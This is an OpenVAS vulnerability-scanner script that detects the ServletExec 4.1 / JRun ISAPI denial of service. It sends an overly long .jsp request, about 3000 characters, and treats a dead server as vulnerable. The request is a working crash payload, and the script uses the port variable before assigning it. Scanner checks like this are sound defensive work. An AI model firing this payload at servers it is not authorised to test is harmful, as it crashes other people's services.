# OpenVAS Vulnerability Test
# $Id: servletExec_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: ServletExec 4.1 / JRun ISAPI DoS
#
# Authors:
# Matt Moore <matt.moore@westpoint.ltd.uk>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Wrong BugtraqID(6122). Changed to BID:4796. Added CAN.
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "By sending an overly long request for a .jsp file it is 
possible to crash the remote web server.

This problem is known as the ServletExec / JRun ISAPI DoS.

Solution for ServletExec: 
Download patch #9 from ftp://ftp.newatlanta.com/public/4_1/patches/";

if(description)
{
 script_id(10958);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1570, 4796);
 script_cve_id("CVE-2002-0894", "CVE-2000-0681");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 name = "ServletExec 4.1 / JRun ISAPI DoS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary;


 script_description(desc);
 
 summary = "Tests for ServletExec 4.1 ISAPI DoS";
 
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Matt Moore");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("www/too_long_url_crash");
 script_xref(name : "URL" , value : "www.westpoint.ltd.uk/advisories/wp-02-0006.txt");
 script_xref(name : "URL" , value : "http://online.securityfocus.com/bid/6122");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# Check starts here

include("http_func.inc");

crashes_already = http_is_dead(port: port, retry:1);
if(crashes_already)exit(0);

port = get_http_port(default:80);

if(get_port_state(port))
{ 
 banner = get_http_banner(port:port);
 if ( ! banner ) exit(0);
 if ( "JRun" >!<  banner ) exit(0);
 
 buff = string("/", crap(3000), ".jsp");

 req = http_get(item:buff, port:port);
	      
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 if (!r)
	security_hole(port);
 
 }
}

